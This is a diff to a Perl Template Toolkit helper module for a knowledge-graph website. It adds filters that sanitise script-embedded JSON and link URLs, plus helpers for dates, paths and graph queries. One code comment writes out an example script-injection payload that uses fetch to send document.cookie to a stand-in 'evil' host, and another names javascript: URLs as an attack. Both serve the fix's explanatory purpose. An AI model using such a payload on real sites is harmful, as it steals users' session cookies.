@@ -15,6 +15,51 @@ $Template::Stash::SCALAR_OPS->{remove_html_tags} = sub {
     return $text;
 };
 
+# safe_js_array: parses a stored attribute string as JSON and re-emits it as
+# a properly-escaped JSON literal safe to interpolate directly inside a
+# <script> block. Used for knot.tt's transcription_candidates, which
+# otherwise interpolated a raw, attacker-settable attribute value straight
+# into script source -- a script-context injection needing no HTML tags at
+# all to run arbitrary JS (setting the attribute to e.g.
+# "[]; fetch('//evil/x?c='+document.cookie); var x=[" executes cleanly).
+# Falls back to an empty array for anything that isn't valid JSON, and
+# escapes '/' so an embedded "</script>" can't prematurely close the
+# surrounding <script> tag (JSON::XS doesn't escape slashes by default;
+# escaping them is always JSON-legal).
+# safe_url: knot.tt renders any attribute whose key matches /_url$/ as a
+# raw <a href="...">, and that value is an ordinary knot attribute any
+# logged-in user can set via /api/update_attribute/ -- setting one to
+# "javascript:..." produced a live script-executing link. Allowlist http(s)
+# and relative/root-relative URLs only; anything else (javascript:, data:,
+# vbscript:, etc.) is replaced with "#".
+$Template::Stash::SCALAR_OPS->{safe_url} = sub {
+    my $url = shift;
+    return '#' unless defined $url;
+    return $url if $url =~ m{^(?:https?://|/|\.\./|\.?/|#)}i;
+    return $url if $url !~ m{:};
+    return '#';
+};
+
+# epoch_int: a handful of existing knots have a fractional-second epoch
+# (see addKnot's fix in Core.pm for why), which crashes
+# Template::Plugin::Date's format() -- it parses a value containing '.' as
+# a date STRING, not a raw epoch number. Truncate defensively here so the
+# knot.tt date picker can't 500 on any knot, old or new.
+$Template::Stash::SCALAR_OPS->{epoch_int} = sub {
+    my $e = shift;
+    return $e unless defined $e;
+    return int($e);
+};
+
+$Template::Stash::SCALAR_OPS->{safe_js_array} = sub {
+    my $raw = shift;
+    my $decoded = eval { JSON::XS->new->decode($raw) };
+    $decoded = [] if $@ || ref($decoded) ne 'ARRAY';
+    my $json = JSON::XS->new->encode($decoded);
+    $json =~ s{/}{\\/}g;
+    return $json;
+};
+
 # knot_name often carries its whole materialized path baked in (either
 # "/"-separated, as baumhaus.tt already strips via knot_name.split('/').last,
 # or "++"-separated elsewhere in the graph) -- strip everything up to and
@@ -26,6 +71,22 @@ sub _short_name {
 	return $short;
 }
 $Template::Stash::SCALAR_OPS->{short_name} = sub { return _short_name(shift); };
+
+# short_path: like short_name, but keeps the last N materialized-path
+# segments (default 2) instead of just the leaf -- for a list of many
+# knots that all share a long common prefix (e.g. last.tt's "most recent
+# 200 knots" grid), showing 2 segments gives useful disambiguating context
+# ("Margaret & Ursula/Ursula Kroeber Le Guin (1929 - 2018)") without
+# repeating "baumhaus.digital/Studium Generale/.../..." on every card.
+$Template::Stash::SCALAR_OPS->{short_path} = sub {
+	my ($name, $n) = @_;
+	return $name unless defined $name;
+	$n ||= 2;
+	my @parts = grep { length } split m{\+\+|/}, $name;
+	return $name unless @parts;
+	return join('/', @parts) if @parts <= $n;
+	return join('/', @parts[-$n..-1]);
+};
 
 # The "epoch" knot attribute is a unix timestamp; Core.pm's attach_attributes
 # already turns that into an "AE......" anno-epoche label and a plain date,
@@ -572,6 +633,28 @@ $Template::Stash::SCALAR_OPS->{get_full_deck} = sub {
 	return attach_attributes $sth->fetchall_arrayref({});
 };
 
+# get_echoes: thematic cross-links between two individual content knots,
+# predicate 'echoes' -- NOT a parent/child tree edge, just "this slide is
+# about the same thing as that knot, somewhere else entirely in the graph".
+# Lets a deck template (kolleg/mainframe) offer a "jump to related content"
+# link per-slide. Bidirectional regardless of which side the bound was
+# stored on, so a link made from one knot is immediately visible from the
+# other without needing a second, reverse bound.
+$Template::Stash::SCALAR_OPS->{get_echoes} = sub {
+	my $knot_id = shift;
+	my $sth = database('knots')->prepare("
+		select k.knot_id, k.knot_name, k.knot_content, k.attributes
+		from bounds b join knots k on k.knot_id = b.obj
+		where b.sub = ? and b.predicate = 'echoes'
+		union
+		select k.knot_id, k.knot_name, k.knot_content, k.attributes
+		from bounds b join knots k on k.knot_id = b.sub
+		where b.obj = ? and b.predicate = 'echoes'
+	");
+	$sth->execute($knot_id, $knot_id);
+	return attach_attributes $sth->fetchall_arrayref({});
+};
+
 # get_chronological: the full is_parent subtree again, but ordered by each
 # knot's own 'epoch' attribute instead of tree position -- a feed/log view
 # rather than a document view. $direction 'desc' (default) reads newest
@@ -642,6 +725,52 @@ $Template::Stash::SCALAR_OPS->{get_graph_json} = sub {
 		@{ $edge_sth->fetchall_arrayref({}) };
 
 	return JSON::XS->new->canonical->encode({ nodes => \@nodes, edges => \@edges });
+};
+
+# get_timeline_json: every descendant of $knot_id with its real historical
+# epoch, plus which top-level section (the depth-1 ancestor) it belongs to --
+# for an exponential/log-scale timeline where the x-axis is "years before
+# now" rather than tree position. Pre-encoded to JSON for direct embedding.
+$Template::Stash::SCALAR_OPS->{get_timeline_json} = sub {
+	my $knot_id = shift;
+	my $limit   = shift || 500;
+
+	my $sth = database('knots')->prepare("
+		WITH RECURSIVE tree(id, depth, section_id) AS (
+			SELECT k.knot_id, 0, NULL::int FROM knots k WHERE k.knot_id = ?
+			UNION ALL
+			SELECT b.obj, t.depth + 1, COALESCE(t.section_id, b.obj)
+			FROM tree t
+			JOIN bounds b ON b.sub = t.id AND b.predicate = 'is_parent' AND b.ord > 0
+			WHERE t.depth < 8
+		)
+		SELECT k.knot_id, k.knot_name, k.knot_content, tree.section_id,
+		       (k.attributes->'epoch')::bigint as epoch_n,
+		       sec.knot_name as section_name
+		FROM tree JOIN knots k ON k.knot_id = tree.id
+		LEFT JOIN knots sec ON sec.knot_id = tree.section_id
+		WHERE tree.depth > 0 AND k.attributes->'epoch' IS NOT NULL
+		ORDER BY epoch_n ASC NULLS LAST
+		LIMIT ?
+	");
+	$sth->execute($knot_id, $limit);
+
+	my @out;
+	for my $row (@{ $sth->fetchall_arrayref({}) }) {
+		my $snippet = $row->{knot_content} // '';
+		$snippet =~ s/<[^>]+>/ /g;
+		$snippet =~ s/\s+/ /g;
+		$snippet = substr($snippet, 0, 140);
+		push @out, {
+			id      => $row->{knot_id} + 0,
+			name    => _short_name($row->{knot_name}),
+			epoch   => ($row->{epoch_n} // 0) + 0,
+			section => $row->{section_id} ? $row->{section_id} + 0 : $row->{knot_id} + 0,
+			section_name => _short_name($row->{section_name} // $row->{knot_name}),
+			snippet => $snippet,
+		};
+	}
+	return JSON::XS->new->canonical->encode(\@out);
 };
 
 
